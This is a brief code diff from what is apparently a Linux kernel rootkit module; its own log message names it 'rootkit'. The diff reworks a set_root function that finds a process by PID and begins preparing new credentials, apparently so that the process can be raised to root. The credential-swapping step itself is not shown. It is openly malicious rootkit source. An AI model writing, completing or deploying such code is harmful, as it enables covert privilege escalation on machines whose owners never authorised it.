@@ -21,8 +21,10 @@ MODULE_VERSION("1.0.0");
 #define IPV4 4
 #define IPV6 6
 
-void find_task(unsigned long task_pid, struct task_struct *task)
+void set_root(unsigned long task_pid)
 {
+    struct task_struct *task;
+    struct cred *root;
     struct pid *proc_pid = find_vpid(task_pid);
 
     if(!proc_pid) 
@@ -38,14 +40,7 @@ void find_task(unsigned long task_pid, struct task_struct *task)
       printk("rootkit: Failed to get this task info.\n");
       return;
     }
-}
 
-void set_root(unsigned long task_pid)
-{
-    struct task_struct *task = NULL;
-    struct cred *root;
-
-    find_task(task_pid, task);
 
     root = prepare_creds();
 
